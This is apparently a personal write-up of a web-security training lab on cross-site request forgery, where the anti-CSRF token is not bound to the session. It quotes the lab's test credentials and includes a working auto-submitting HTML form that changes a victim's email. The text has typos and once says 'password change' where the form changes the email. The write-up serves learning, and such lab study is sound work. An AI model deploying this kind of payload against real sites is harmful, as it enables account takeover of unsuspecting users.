# Practitioner Lab 80 : CSRF where token is not tied to user session

---

This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

- `wiener:peter`
- `carlos:montoya`

if the user is logged in then you can use their CSRF token to change the emai;l

In this case I just used the CSRF Token of the logged in account wiener to change Carlos’ email

but the CSRF token can’t have already been used. This is because they are only used once.

Because of this, I captured the request and then used that CSRF token to exploit the password change.

```
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<form action="[https://0a20008a03a39b2b814d57fd0079009a.web-security-academy.net/my-account/change-email](https://0a20008a03a39b2b814d57fd0079009a.web-security-academy.net/my-account/change-email)" method="POST">
<input type="hidden" name="email" value="test2@me" />
<input type="hidden" name="csrf" value="YkENKPliLaQyq3Ib2smwENXj4TWSbgsY" />
<input type="submit" value="Submit request" />
</form>
<script>
history.pushState('', '', '/');
document.forms[0].submit();
</script>
</body>
</html>
```

![Untitled](Practitioner%20Lab%2080%20CSRF%20where%20token%20is%20not%20tied%20t%20ae2136835b294d1e8b02d5c9a78971fe/Untitled.png)